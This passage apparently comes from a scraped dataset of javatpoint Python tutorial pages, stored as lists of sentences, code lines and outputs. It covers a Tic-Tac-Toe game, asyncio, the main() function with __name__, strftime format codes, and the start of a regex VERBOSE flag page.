working of the game. We can update the game information by adding the following snippet of code to the main project.', 'After each move, we need to check if any player has won the match or the match has been tied. We can check it with the help of the syntax given below:', ""In the above syntax, we have used the if statement to check for Win or Tie. The singlegame() function will return the current player if he/she wins the game. Otherwise, the game is tied, 'D' is sent back."", 'In the above snippet of code, we have defined the functions to check the Victory or Tie. These functions are check_Victory() and check_Tie(), respectively.', 'Every player got only one chance at a time. Thus, after every successful more, the current player will be swapped. Let us consider the following snippet of code for the same:', 'These are some steps we need to be concerned about while making a single game. However, we will be creating a Scoreboard System to keep track of the players wanting to play multiple games.', ""We have to store the information such as the current player, the player's selection (i.e., X or O), the available selections (X or O), and the scoreboard."", 'In the above snippet of code, we have set the current player as the First player. We have also stored the selections made by Players, available options, and the scoreboard.', 'In order to maintain multiple matches of Tic-Tac-Toe, we require another loop for the game. The current player will choose the mark for each match. The menu for selection should be displayed in every iteration of the game.', ""In the above snippet of code, we have created a while loop to display the main menu for the Players where the current player can make the selection between the marks (Cross 'X' or Naught 'O') or exit the game."", 'In the above snippet of code, we have used the try-exception block to handle any exception for the the_choice input. We have then used the if-else statement to create the choice menu for the current player to select from.', 'In the above snippet of code, we have used the if statement to check if the match is not tied. Once the match is not drawn, the scoreboard will be updated.', 'While playing a game, it becomes mandatory to switch the chance of choosing the mark. So, let us consider the following syntax to understanding the swapping.']","['Tic-Tac-Toe is among the games played between two players played on a 3 x 3 square grid. Each player inhabits a cell in their respective turns, keeping the objective of placing three similar marks in a vertical, horizontal, or diagonal pattern. The first player utilizes the Cross (X) as the marker, whereas the other utilizes the Naught or Zero (O).', 'In the above snippet of code, we have defined a function for the Tic-Tac-Toe game that takes the values as the parameter. Here the val parameter is a list consists of the status of each cell in the grid. Within the function, we have then printed the design of the Tic-Tac-Toe grid.', 'In the above snippet of code, we have defined a function for a single game of Tic-Tac-Toe where the val represents the parameter for the previous function and playerpos stores the position of the block occupied by the cross (X) and naught (O), respectively.', 'For the above snippet of code, we have created a try block to handle the unintended value of the players. We have then handled the exception of ValueError so that the game must not be stopped. Later we have performed few sanity checks, such as whether the entered value is a valid position or not, and if it is a valid position, is it filled already?', 'In the above snippet of code, we have updated the game information by updating the status of the grid and the position of the player. The val list will update the cell filled as per the current player. The position of the player will add the position just occupied by the current player.', 'In the following snippet of code, we have used the if-else statement in order to switch moves of the player in such a way that if the current player marks one position, then the current player will be changed, and the other player will mark their move.', 'As we can observe, we have used the special variable __name__ to have the value of ""__main__"". We have then provided the input for the names of the first and second players, respectively. This will become the entry point for the program, and when the program we will be executed, it will ask for the names first.', 'We will design a scoreboard in a dictionary data structure. For this scoreboard, the player names will act as the keys, and their total number of victories will act as the values. Let us consider the following snippet of code to design the Scoreboard for Tic-Tac-Toe.', 'In the above snippet of code, we have defined the function as myscoreboard that takes the parameter as the scoreboard. We have then printed the design for the Score Board. We have defined the variable that stores the names of the players as a list using the .keys() function. We have then indexed them into the scoreboard and displayed the scores.']","['# Function to print the Tic-Tac-Toe Design', 'def mytictactoe(val):', 'print(""\\n"")', 'print(""\\t     |     |"")', 'print(""\\t  {}  |  {}  |  {}"".format(val[0], val[1], val[2]))', ""print('\\t_____|_____|_____')"", 'print(""\\t     |     |"")', 'print(""\\t  {}  |  {}  |  {}"".format(val[3], val[4], val[5]))', ""print('\\t_____|_____|_____')"", 'print(""\\t     |     |"")', 'print(""\\t  {}  |  {}  |  {}"".format(val[6], val[7], val[8]))', 'print(""\\t     |     |"")', 'print(""\\n"")', '# Function for a single game of Tic-Tac-Toe', 'def singlegame(curplayer):', '# Representing the Tic-Tac-Toe', ""val = [' ' for i in range(9)]"", '# Storing the positions occupied by X and O', ""playerpos = {'X' : [], 'O' : []}"", '# Loop of Game for a single game of Tic-Tac-Toe', 'while True:', 'mytictactoe(val)', '# Try-Exception block for CHANCE input', 'print(""Player "", curplayer, "" turn. Choose your Block : "", end="""")', 'chance = int(input())', 'except ValueError:', 'print(""Invalid Input!!! Try Again"")', 'continue', '# Sanity check for CHANCE input', 'if chance < 1 or chance > 9:', 'print(""Invalid Input!!! Try Again"")', 'continue', '# Checking if the block is not occupied already', ""if val[chance - 1] != ' ':"", 'print(""Oops! The Place is already occupied. Try again!!"")', 'continue', '# Updating the game information', '# Update the status of the grid', 'val[chance - 1] = curplayer', '# Update the positions of the player', 'playerpos[curplayer].append(chance)', '# Calling Function to check Victory', 'if check_Victory(playerpos, curplayer):', 'mytictactoe(val)', 'print(""Congratulations! Player "", curplayer, "" has won the game!"")', 'print(""\\n"")', 'return curplayer', '# Calling Function to check Tie', 'if check_Tie(playerpos):', 'mytictactoe(val)', 'print(""Oh! Game Tied"")', 'print(""\\n"")', ""return 'D'"", '# Defining Function to check Victory', 'def check_Victory(playerpos, curplayer):', '# All probable winning combinations', 'solution = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [1, 4, 7], [2, 5, 8], [3, 6, 9], [1, 5, 9], [3, 5, 7]]', '# Loop to check whether any winning combination is satisfied or not', 'for i in solution:', 'if all(j in playerpos[curplayer] for j in i):', '# Return True if any winning combination is satisfied', 'return True', '# Return False if no combination is satisfied', 'return False', '# Defining Function to check if the game is Tied', 'def check_Tie(playerpos):', ""if len(playerpos['X']) + len(playerpos['O']) == 9:"", 'return True', 'return False', '# Switching moves of the player', ""if curplayer == 'X':"", ""curplayer = 'O'"", ""curplayer = 'X'"", 'if __name__ == ""__main__"":', 'print(""First Player"")', 'FirstPlayer = input(""Specify the Name: "")', 'print(""\\n"")', 'print(""Second Player"")', 'SecondPlayer = input(""Specify the Name: "")', 'print(""\\n"")', '# Storing the player who chooses X and O', 'curplayer = FirstPlayer', ""# Storing the Players' choice"", 'playerchoice = {\'X\' : """", \'O\' : """"}', '# Storing the options', ""opt = ['X', 'O']"", '# Storing the scoreboard', 'scoreboard = {FirstPlayer: 0, SecondPlayer: 0}', 'myscoreboard(scoreboard)', 'def myscoreboard(scoreboard):', 'print(""\\t--------------------------------"")', 'print(""\\t         SCORE BOARD       "")', 'print(""\\t--------------------------------"")', 'listofplayers = list(scoreboard.keys())', 'print(""\\t   "", listofplayers[0], ""\\t    "", scoreboard[listofplayers[0]])', 'print(""\\t   "", listofplayers[1], ""\\t    "", scoreboard[listofplayers[1]])', 'print(""\\t--------------------------------\\n"")', '# Loop for a series of Tic-Tac-Toe game', '# The loop executes until the players quit', 'while True:', '# Main Menu for Players', 'print(curplayer, ""will make the choice:"")', 'print(""Press 1 for X"")', 'print(""Press 2 for O"")', 'print(""Press 3 to Quit"")', '# Try exception for THE_CHOICE input', 'the_choice = int(input())', 'except ValueError:', 'print(""Invalid Input!!! Try Again\\n"")', 'continue', '# Conditions for player choice', 'if the_choice == 1:', ""playerchoice['X'] = curplayer"", 'if curplayer == FirstPlayer:', ""playerchoice['O'] = SecondPlayer"", 'else:', ""playerchoice['O'] = FirstPlayer"", 'elif the_choice == 2:', ""playerchoice['O'] = curplayer"", 'if curplayer == FirstPlayer:', ""playerchoice['X'] = SecondPlayer"", 'else:', ""playerchoice['X'] = FirstPlayer"", '', 'elif the_choice == 3:', 'print(""The Final Scores"")', 'myscoreboard(scoreboard)', 'break', 'print(""Invalid Selection!! Try Again\\n"")', '# Storing the winner in a single game of Tic-Tac-Toe', 'win = singlegame(opt[the_choice - 1])', '# Updation of the scoreboard as per the winner', ""if win != 'D' :"", 'playerWon = playerchoice[win]', 'scoreboard[playerWon] = scoreboard[playerWon] + 1', 'myscoreboard(scoreboard)', '# Switching player who chooses X or O', 'if curplayer == FirstPlayer:', 'curplayer = SecondPlayer', 'curplayer = FirstPlayer']","['|     |', '1  |  2  |  3', '_____|_____|_____', '|     |', '4  |  5  |  6', '_____|_____|_____', '|     |', '7  |  8  |  9', '|     |', 'First Player', 'Specify the Name: Andy', 'Second Player', 'Specify the Name: Carlo', '--------------------------------', 'SCORE BOARD', '--------------------------------', 'Andy             0', 'Carlo            0', '--------------------------------', 'Andy will make the choice:', 'Press 1 for X', 'Press 2 for O', 'Press 3 to Quit', 'First Player', 'Specify the Name: Andy', 'Second Player', 'Specify the Name: Carlo', '--------------------------------', 'SCORE BOARD', '--------------------------------', 'Andy             0', 'Carlo            0', '--------------------------------', 'Andy will make the choice:', 'Press 1 for X', 'Press 2 for O', 'Press 3 to Quit', '1', '|     |', '|     |', '_____|_____|_____', '|     |', '|     |', '_____|_____|_____', '|     |', '|     |', '|     |', 'Player  X  turn. Choose your Block : 5', '|     |', '|     |', '_____|_____|_____', '|     |', '|  X  |', '_____|_____|_____', '|     |', '|     |', '|     |', 'Player  O  turn. Choose your Block : 3', '|     |', '|     |  O', '_____|_____|_____', '|     |', '|  X  |', '_____|_____|_____', '|     |', '|     |', '|     |', 'Player  X  turn. Choose your Block : 1', '|     |', 'X  |     |  O', '_____|_____|_____', '|     |', '|  X  |', '_____|_____|_____', '|     |', '|     |', '|     |', 'Player  O  turn. Choose your Block : 9', '|     |', 'X  |     |  O', '_____|_____|_____', '|     |', '|  X  |', '_____|_____|_____', '|     |', '|     |  O', '|     |', 'Player  X  turn. Choose your Block : 6', '|     |', 'X  |     |  O', '_____|_____|_____', '|     |', '|  X  |  X', '_____|_____|_____', '|     |', '|     |  O', '|     |', 'Player  O  turn. Choose your Block : 4', '|     |', 'X  |     |  O', '_____|_____|_____', '|     |', 'O  |  X  |  X', '_____|_____|_____', '|     |', '|     |  O', '|     |', 'Player  X  turn. Choose your Block : 2', '|     |', 'X  |  X  |  O', '_____|_____|_____', '|     |', 'O  |  X  |  X', '_____|_____|_____', '|     |', '|     |  O', '|     |', 'Player  O  turn. Choose your Block : 8', '|     |', 'X  |  X  |  O', '_____|_____|_____', '|     |', 'O  |  X  |  X', '_____|_____|_____', '|     |', '|  O  |  O', '|     |', 'Player  X  turn. Choose your Block : 7', '|     |', 'X  |  X  |  O', '_____|_____|_____', '|     |', 'O  |  X  |  X', '_____|_____|_____', '|     |', 'X  |  O  |  O', '|     |', 'Game Tied', '--------------------------------', 'SCORE BOARD', '--------------------------------', 'Andy             0', 'Carlo            0', '--------------------------------', 'Carlo will make the choice:', 'Press 1 for X', 'Press 2 for O', 'Press 3 to Quit', '3', 'The Final Scores', '--------------------------------', 'SCORE BOARD', '--------------------------------', 'Andy             0', 'Carlo            0', '--------------------------------']",[],"[""|||Grid Status:We have to create a data structure that will contain the state of each cell. The state can either be occupied or vacant.|||Moves of each player:The knowledge of past and present moves of each player is somehow required, that is, the positions occupied by 'X' and 'O'.||||||' ' - This character signifies the vacant or empty cell.|||'X' - This character signifies that a Cell is inhabited by the X Player.|||'O' - This character signifies that a Cell is inhabited by the O Player.||||||check_Victory(): It stores all the combinations for winning the game. The function checks if the position of the current player satisfies any of the winning combinations. If it does, it will return TRUE; else, it will FALSE for not satisfying the requirement.|||check_Tie(): It is pretty simple, which checks if all 'Nine' positions are occupied, the game is tied.|||""]"
211,['Python Asynchronous Programming - asyncio and await'],"[""the asyncio module. The asyncio module comes with excellent features that allow us to write more efficient Python asynchronous applications. We will explore how to manage an async event loop in Python. Before dive deep into this topic, let's understand what asynchronous programming is.""]","['https://www.javatpoint.com/python-main-function', 'https://www.javatpoint.com/tic-tac-toe-in-python', 'https://www.javatpoint.com/python-main-function', 'https://www.javatpoint.com/tic-tac-toe-in-python', 'https://www.javatpoint.com/python-main-function']",[],[],"['What is Asynchronous Programming?', 'What is asyncio - Asynchronous I/O?', 'Coroutines and Tasks', 'Manage an async event loop in Python', 'Read and Write Data with Stream in Python', 'Synchronization tasks in Python', 'When to use asynchronous programming?', 'Some Important Functions in Asyncio', 'Conclusion']","['Example - 1', 'Example - 2', 'Example - 3 Creating Tasks', 'Example -', 'Running an asyncio Program', 'Creating Tasks', 'Sleeping', 'Timeouts']",[],"[""It means the processor doesn't sit ideal if the program will perform another task while the previous hasn't yet finished and still running elsewhere."", 'In this tutorial, we will explain why we need such a type of programming.', 'This module provides the framework that works around the event loop and also take care of such things as I/O and system events.', 'This module provides the framework that works around the event loop and takes care of such things as I/O and system events.', 'Explanation -', 'In the above code -', ""We can also schedule tasks or objects that bind coroutine and help them to run. Let's understand the following example."", 'Explanation -', 'In the above code,', ""Now, let's make some changes to the above code and see the result."", 'The event loop comes with the following features.', ""Let's see the following example."", 'There are two classes, StreamReader and StreamWriter of asyncio. These classes are used to read and write from the network at a high level.', ""Let's understand the following implementation method."", 'In the following scenario, we can use asynchronous programming.', 'Some of the tasks are given below, which can work well with the asyncio.', 'Below are the some essential methods that used while doing asynchronous programming.', 'Example - ']","['This slows down the program as it is forced to stop and wait for something to finish. Many processors are available in the system, so it is a waste of resources to do other tasks rather than the ideal sit.', 'To overcome this, the asynchronous programming concept comes into play. It behaves differently; it also takes one execution at a time. But the system may not wait to finish the execution to move on next step.', 'We can see that it is 1 second faster than the previous program. The create.task() method will run in the event loop, with its result put in the task. We have scheduled the two tasks and returned them using the await.', 'The event loop starts by getting asyncio.get_event_loop() , scheduling and running the async task and close the event loop when we done with the running.', 'To read from network, we need to open the network using the asyncio.open_connection(). The StreamReader and StreamWriter objects function return tuple, we would use .read() and .write() method to each connection.', 'The asyncio.start_server() method is used to receive the connection from the remote hosts. This function takes a callback function, client_connected_cb as arguments. It is called whenever the function received the request.', 'We have discussed earlier, Asynchronous program runs separately, but sometimes we would want to communicate with each other. The asyncio module offers us a queue and various other methods to establish the synchronization between the tasks.', ""Here, a point should always keep in mind that these methods are not thread-safe. This isn't an issue for async tasks running in the same event loop. But we need to use the thread module to share the information between the tasks."", 'The asyncio module allows us to perform multiple tasks in parallel and iterate through them efficiently, without blocking the rest of the application.']","[""In synchronous programming, the methods are written to perform one task at a time. If a function depends on the other function's output, it has to wait to finish the execution of that function. The program is essentially stopped until the function finishes its execution. It means that one program can get executed at a time."", 'An asyncio is a Python library which is used to run the concurrent code using the async/wait. It is a foundation for Python asynchronous framework that offers connection libraries, network and web-servers, database distributed task queues, high-performance, etc.', 'An asyncio is a Python library used to run the concurrent code using the async/wait. It is a foundation for Python asynchronous framework that offers connection libraries, network, web-servers, database distributed task queues, high-performance, etc.', ""Asyncio is also used for managing the async event loop. An event loop is an object that runs async functions and callbacks. When we want to execute the coroutines, the event will be crucial for the asynchronous functions when we run the asyncio.run() method; the event loop object is created automatically. To implement the more advanced server, we will need lower-level access to the event loop. We need to work directly with the event loop's internals."", 'The asyncio module offers stream which is used to perform high-level network I/O. It can behave as a server for network requests. It is best for long-running network operations where application block waiting for some other resources to return a result.', 'This tutorial includes the concept of asynchronous programming using the Python asyncio module. The asyncio gives us programmatic control of when context when we use the context switches. That means we can handle many complex issues that occur with threaded programming.', 'It is a powerful and valuable tool, but only for asynchronous type programming. We have discussed Coroutines and tasks with their respective example. We have also discussed managing the event loop and reading and writing data with stream in Python. It also includes the essential methods.']","['import asyncio', 'async def main():', 'print (""Waiting 5 seconds. "")', 'for _ in range(5):', 'await asyncio.sleep(1)', 'print (""Hello"")', 'print (""Finished waiting."")', 'asyncio.run(main())', 'import asyncio', 'import time', 'async def execute(delay, value):', 'await asyncio.sleep(delay)', 'print(value)', 'async def main():', 'print(f""started at {time.strftime(\'%X\')}"")', ""await execute(1, 'hello')"", ""await execute(2, 'world')"", 'print(f""finished at {time.strftime(\'%X\')}"")', 'asyncio.run(main())', 'async def execute(delay, value):', 'await asyncio.sleep(delay)', 'print(value)', 'async def main():', '# Using asyncio.create_task() method to run coroutines concurrently as asyncio', 'task1 = asyncio.create_task(', ""execute(1, 'hello'))"", 'task2 = asyncio.create_task(', ""execute(2, 'world'))"", 'print(f""started at {time.strftime(\'%X\')}"")', '# Wait until both tasks are completed (should take', '# around 2 seconds.)', 'await task1', 'await task2', 'print(f""finished at {time.strftime(\'%X\')}"")', 'asyncio.run(main())', 'import asyncio', 'async def speech_async():', ""print('This is a asynchronicity!')"", 'loop = asyncio.get_event_loop()', 'loop.run_until_complete(speech_async())', 'loop.close()', 'async def main():', 'await asyncio.sleep(1)', ""print('hello')"", 'asyncio.run(main())', 'async def coro():', '...', '# In Python 3.7+', 'task = asyncio.create_task(coro())', 'task = asyncio.ensure_future(coro())', 'import asyncio', 'async def main():', 'for _ in range(3):', 'await asyncio.sleep(1)', 'print (""Hello"")', 'asyncio.run(main())', 'async def myfunc():', '# Sleep for ten minutes', 'await asyncio.sleep(600)', ""print('hello!')"", 'async def main():', '# Wait for at most 1 second', 'try:', 'await asyncio.wait_for(myfunc(), timeout=1.0)', 'except asyncio.TimeoutError:', ""print('timeout!')"", 'asyncio.run(main())']","['Waiting 5 seconds.', 'Hello', 'Hello', 'Hello', 'Hello', 'Hello', 'Finished waiting.', 'started at 11:11:54', 'hello', 'world', 'finished at 11:11:57', 'started at 15:43:30', 'hello', 'world', 'finished at 15:43:32', 'This is a asynchronicity!']",[],"['|||We have imported the asyncio module to get access to Python async functionality.|||Then create a primary() function and write the async keyword in front of that. This will allow the program to run the task asynchronously.|||We used for loop and called the sleep() method, which forced us to wait 1 second.|||The program prints ""Hello"" after one second.|||Program should have the one .run() function as well as one .main() function.||||||We have imported the asyncio and time module.|||Then we defined execute() function with the delay and value arguments. It prints the delay time using the sleep() method.|||In the main() function, we have passed two arguments: the first is delay time, and the second is value to be print.|||The program starts its execution and prints the exact execution time, print \'hello\' then wait for the two seconds and print \'world\' and stop.||||||It can register, execute, and cancel delayed calls (asynchronous functions)|||It can create client and server transports for communication|||It can create subprocesses and transports for communication with another program.|||Delegate function calls to a pool of threads.||||||Queues - The asyncio queues facilitate asynchronous functions to line up Python objects to be consumed by other async functions. For example - The workload is distributed between the function on its behavior.|||Synchronization Primitive - The asyncio\'s features locks, events, conditions, and semaphores act as conventional Python counterparts.||||||When we want complete work in quick time.|||The delay involves waiting for I/O (disk or network) operations, not computation.|||When many I/O operations are happing at once.||||||Web scraping.|||Network Services (web server and framework)|||Simultaneous Database||||||asyncio.run(coro, *, debug = False) - This function is used to block the execution for delay seconds. It suspends the current task and allows another task to run. The delay is an argument that shows the number of seconds.||||||create_task(coro, *, name = None) - This function wraps the Coroutines into a Task and schedule its execution. It returns the task object.||||||sleep(delay, result = None, *, loop = None) - This function is used to block the execution for delay seconds. It suspends the current task and allows other task to run. The delay is an argument which shows the number of seconds.||||||coroutinewait_for(aw, timeout, *, loop = None) - This function is used to wait for the aw (a coroutine automatically schedule as a Task) awaitable to complete with a timeout.|||']"
212,['Python main() function'],"['In this tutorial, we will learn about the main() function in the Python programming language. And we will also understand how we can utilize the __name__ attribute in Python program in order to execute it dynamically in various contexts.']","['https://www.javatpoint.com/strftime-function-in-python', 'https://www.javatpoint.com/python-asynchronous-programming-asyncio-and-await', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/strftime-function-in-python', 'https://www.javatpoint.com/python-asynchronous-programming-asyncio-and-await', 'https://www.javatpoint.com/strftime-function-in-python']",[],[],"['Understanding the main() function in Python', 'Understanding the __name__ property in Python', 'Executing Python File as a Script', 'Executing Python File as a Module', 'Using if statement with the __name__ variable']",[],[],"['Let us begin with understanding what the main() function in Python is.', 'Now, let us understand the __name__ property in Python programming language.', 'The __name__ property is a unique core variable in the Python that displays the name of the present module.', 'Let us consider that we have a Python file known as myworld.py containing the following content:', 'File: myworld.py', 'Explanation:', 'In the above program file, we have printed the value of the __name__ property. As a result, the value of the __name__ variable is set to __main__.', 'Suppose that we have created a Python file as python_main.py in the same directory as the myworld.py file with the following content:', 'File: python_main.py', 'Explanation:', 'This happens because, in the context of executing a Python file as a module, the module name itself is assigned to the __name__ variable.', 'Let us consider the following example where we have changed the content of the myworld.py file.', 'File: myworld.py', 'Explanation:']","['Python provides other conventions in order to define the point of execution. One of them is utilizing the main() function along with the __name__ property of a python file.', 'This property offers different values relying on where we run the Python file. Let us consider an example to understand the __name__ property in a better way.', 'We can also execute a Python file as a module. In order to perform this, we need to import the required file into another Python program. Let us consider the following example to understand the concept properly.', 'Since we have correctly understood how the __name__ property is assigned values, we can utilize the if statement in order to run the same Python file differently in various contexts.', 'However, when we execute the file as a module by importing it in the python_main.py, the program returns no output as the main() function is not called.', 'Thus, we can conclude the custom main() function we have defined in the myworld.py file can only be executed as a standalone script but not as an imported module.', 'This is the standard method to define the main() function explicitly in Python. It is among the most popular use cases of the __name__ property of a Python file.']","['The main() is considered a unique function for several programming languages, also referred to as the point of execution for a program file. However, the interpreter of the Python programming language executes each of the lines serial-wise from the top of the file and has no explicit main() function.', 'In the above program file, we have imported a module as myworld. As a result, when we executed the python_main.py file, the program runs the complete code in the module file. However, we can observe that the displays the module name that is myworld instead of displaying __main__.', 'In the above snippet of code, we have defined a function as main() to print some strings for the users. We have then used the if conditional clause to check if the value of the __name__ variable is equal to the __main__, then the main() function will execute. As a result, when we executed the myworld.py file, the string message is printed for the user.']","['print(__name__)', 'import myworld', 'def main():', 'print(""This is my Python program."")', 'if __name__ == ""__main__"":', 'main()']","['$ python myworld.py', '__main__', '$ python python_main.py', 'myworld', '$ python myworld.py', 'This is my Python program.']",[],[]
213,['The strftime() function in Python'],"['In this tutorial, we will understand the working of the strftime() function in the Python programming language along with its variations.']","['https://www.javatpoint.com/verbose-flag-in-python-regex', 'https://www.javatpoint.com/python-main-function', 'https://www.javatpoint.com/https://www.javatpoint.com/python-tutorial', 'https://www.javatpoint.com/verbose-flag-in-python-regex', 'https://www.javatpoint.com/python-main-function', 'https://www.javatpoint.com/verbose-flag-in-python-regex']",[],[],"['Using Python strftime() function to get the present time', 'Using Python strftime() function along with a predefined timestamp', 'Using various Format codes with Python strftime() function']",[],[],"['So, let us begin.', 'The syntax for the same is shown below.', 'But before that, let us consider an example.', 'Explanation:', 'We can see the syntax for the usage of the strftime() function as follows:', 'Now, let us consider an example illustrating the working of the strftime() function together with a predefined timestamp.', 'Explanation:', 'Let us consider an example representing the usage of Format code.', 'Explanation:', 'Now let us consider some more examples using other Format codes.', '1. Using ""%c"" as a format code in order to show the current local time in the following format:', 'Day Month Date hours:minutes:seconds Year', 'Explanation:', '2. Using ""%R"" as a format code in order to represent the time in a 24-hour format.', 'Explanation:', 'We have again followed the same syntax in the above program, but we include the format code ""%R"" to display the current time in 24-hour format.', '3. Using ""%r"" as a format code in order to represent the time in 12-hour format or Hours:Minutes:Seconds format along with the AM or PM notation.', 'Explanation:', '4. Using multiple format codes in a single function.', 'Explanation:', 'Apart from the above format codes, there are many format codes available. These format codes are listed below:']","['Moreover, the strftime() function of Python accepts the time in different formats and returns a string with the time representing in the standard form.', 'We can use the Python strftime() function together with the datetime module in order to fetch the present timestamp in a proper format as per the format codes.', 'Sometimes it happens when we want to show the date and time of the past datasets. We can perform the same with the help of the strftime() function in Python.', 'In the above program, we have again carried out the equivalent procedure we did earlier. However, we have used ""%c"" as the format code. As a result, the program has printed the current timestamp in the format code specified above.', 'Similar to what we have done earlier, we have added the ""%r"" as the parameter for the strftime() function to print the current time in 12-hour format.']","['As we already know, there are a variety of modules provided by Python that contain clusters of functions in order to implement different types of functionalities on the data. The time module of Python is utilized to implement manipulations based on the various timestamp all over.', 'Here, the parameter of the strftime() function, format codes, are actually the predefined codes utilized in order to represent the timestamp in a standard and proper way. We will understand much more about the format codes in detail throughout this tutorial.', 'In the above example, we have imported the datetime module from the datetime library. We have then defined a variable storing the value of the current date and time. We have then used the strftime() function to represent the current date and time into the specified standard format and printed them to the users. As a result, the current date and time have been printed successfully in the proper and standard format.', 'The fromtimestamp() method of the datetime module helps the user to fetch the predefined timestamp. Moreover, we can use the strftime() function in order to represent that fetched timestamp in a standard format using the different format codes as explained earlier.', 'In the above example, we have then defined the variable storing the value of the predefined timestamp. We have then used the fromtimestamp() method to fetch the stored value and the strftime() function to represent the fetched timestamp into a proper and standard format. We have then printed the resultant values for the users. As a result, the timestamp has been represented in the proper specified format successfully.', 'Python strftime() function utilizes different format codes in order to represent date and time in a maintained and standard form. Moreover, these format codes can be used to segregate hours, days, weeks, and a lot more from the timestamp and show the same.', 'In the above example, we have imported the strftime function from the time module. We have then defined a variable that uses the strftime() function along with the parameter ""%A"" as the format code for the current day of the local time. We have then printed the values for the user. As a result, the program has printed the full name of the day accordingly.', 'In the above example, we have used the format code ""%x"" in order to show the date from the local timestamp. We have also utilized the format code ""%X"" in order to display the current time in 24-hour format along with the format code ""%p"" in order to provide the notation for the current time, i.e., AM or PM.']","[""datetime.now().strftime('format codes')"", '# importing the datetime module', 'from datetime import datetime', '# storing the value of current timestamp', 'cur_timestamp = datetime.now()', '# using the strftime() function to represent', '# timestamp into proper and standard format', 'the_time = cur_timestamp.strftime( ""%H : %M : %S"" )', 'the_date = cur_timestamp.strftime( ""%d - %m - %Y"" )', '# printing the values', 'print(""Present Time:"", the_time)', 'print(""Present Date:"", the_date)', ""datetime.fromtimestamp(timestamp).strftime('format code')"", '# importing the datetime module', 'from datetime import datetime', '# provided timestamp', 'provided_timestamp = 114579923', '# storing the value of provided timestamp', 'my_timestamp = datetime.fromtimestamp(provided_timestamp)', '# using the strftime() function to represent', '# timestamp into proper and standard format', 'the_time = my_timestamp.strftime( ""%H : %M : %S"" )', 'the_date = my_timestamp.strftime( ""%d - %m - %Y"" )', '# printing the values', 'print(""Time as per the provided Timestamp:"", the_time)', 'print(""Date as per the provided Timestamp:"", the_date)', '# importing the strftime function', 'from time import strftime', '# using ""%A"" as the format code', '# ""%A"" displays the current day of the local time', 'the_day = strftime( ""%A"" )', '# printing the values', 'print(""Present Day:"", the_day)', '# importing the strftime function', 'from time import strftime', '# using ""%c"" as the format code', '# ""%c"" displays the current local time', 'the_timestamp = strftime( ""%c"" )', '# printing the values', 'print(""Present Timestamp:"", the_timestamp)', '# importing the strftime function', 'from time import strftime', '# using ""%R"" as the format code', '# ""%R"" displays the current time in 24-hour format', 'the_24hour = strftime( ""%R"" )', '# printing the values', 'print(""Present Time in 24-hour format:"", the_24hour)', '# importing the strftime function', 'from time import strftime', '# using ""%r"" as the format code', '# ""%r"" displays the current local time in H:M:S format', 'the_time = strftime( ""%r"" )', '# printing the values', 'print(""Present Time in 12-hour format:"", the_time)', '# importing the strftime function', 'from time import strftime', '# using multiple format code', '# ""%x"" displays the current date', '# ""%X"" displays the current time in 24-hour format', '# ""%p"" provides discriptions for current time i.e., AM or PM', 'the_timestamp = strftime( ""%x -- %X %p"" )', '# printing the values', 'print(""Present Timestamp:"", the_timestamp)']","['Present Time: 18 : 06 : 17', 'Present Date: 01 - 06 - 2021', 'Time as per the provided Timestamp: 09 : 15 : 23', 'Date as per the provided Timestamp: 19 - 08 - 1973', 'Present Day: Tuesday', 'Present Timestamp: Wed Jun  2 16:06:41 2021', 'Present Time in 24-hour format: 16:14', 'Present Time in 12-hour format: 04:33:12 PM', 'Present Timestamp: 06/02/21 -- 16:44:11 PM']","['S. No.|||Format Code|||Description&&&1|||%a|||Weekday name in short&&&2|||%A|||Complete weekday name&&&3|||%b|||Name of the month in short&&&4|||%B|||Complete month name&&&5|||%c|||Chosen date and time representation&&&6|||%C|||Number of the Century (the year divided by 100, ranging from 00 to 99)&&&7|||%d|||Month day (ranging from 01 to 31)&&&8|||%D|||Similar function as %m / %d / %y&&&9|||%e|||Month day (ranging from 1 to 31)&&&10|||%g|||Similar function as %G; however, the value is printed without the century&&&11|||%G|||4-digit year equivalent to the ISO week number (refer %V)&&&12|||%h|||Similar function as %b&&&13|||%H|||Hour, utilizing a 24-hour clock (ranging from 00 to 23)&&&14|||%I|||Hour, utilizing a 12-hour clock (ranging from 01 to 12)&&&15|||%j|||Year day (ranging from 001 to 366)&&&16|||%m|||Month (ranging from 01 to 12)&&&17|||%M|||Minute&&&18|||%n|||Newline character&&&19|||%p|||Either AM or PM as per the provided time value&&&20|||%r|||Time in AM and PM notation&&&21|||%R|||Time in 24-hour notation&&&22|||%S|||Second&&&23|||%t|||Tab character&&&24|||%T|||Current time, equal to ""%H:%M:%S"" format&&&25|||%u|||Days of Week represented as a number (ranging from 1 to 7) where Monday is considered as 1. Warning: In Sun Solaris Sunday is considered as 1.&&&26|||%U|||week number of the current year, beginning with the first Sunday as the first day of the first week.&&&27|||%V|||The ISO 8601-week number of the current year (ranging from 01 to 53), where week 1 is the first week that has at least four days in the current year, and with Monday is considered as the first week day&&&28|||%w|||Day of the week as a decimal, where Sunday is considered as 0.&&&29|||%W|||Week number of the current year, beginning with the first Monday as the first day of the first week.&&&30|||%x|||Chosen depiction of date without the time&&&31|||%X|||Chosen depiction of time without the date&&&32|||%y|||The Year lacking a century (ranging from 00 to 99)&&&33|||%Y|||The Year together with the century&&&34|||%z or %Z|||Time zone or name or abbreviation&&&35|||%%|||An actual % character']",[]
214,['Verbose Flag in Python Regex'],"['In this article, we will discuss about the VERBOSE flag of the re package and how the users can use it.']","['https://www.javatpoint.com/python-ast-module', 'https://www.javatpoint.com/strftime-function-in-python', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com//cdn-cgi/l/email-protection', 'https://www.javatpoint.com/python-ast-module', 'https://www.javatpoint.com/strftime-function-in-python', 'https://www.javatpoint.com/python-ast-module']",[],[],"['The re.VERBOSE', 'Use case of Verbose Flag']",[],[],['Example 1:'],"['The VERBOSE flag of the regex package allows the user to write regular expressions that can look nicer and are more readable. This flag does that by allowing the users to visually separate the logical sections of the pattern and add more comments.', 'The above commands are passed as an argument to the re.compile() method, which is written as ""re.compile(Regular Expression , re.VERBOSE). The re.compile() method will return the REGEX OBJECT, which will be matched with the given string.', ""Let's see an example to understand it in a better way. Suppose the users are asked to enter their EMAIL ID, and the developer has to validate it by using RegEX. The format of the EMAIL is written below:""]","['The whitespaces inside the pattern are 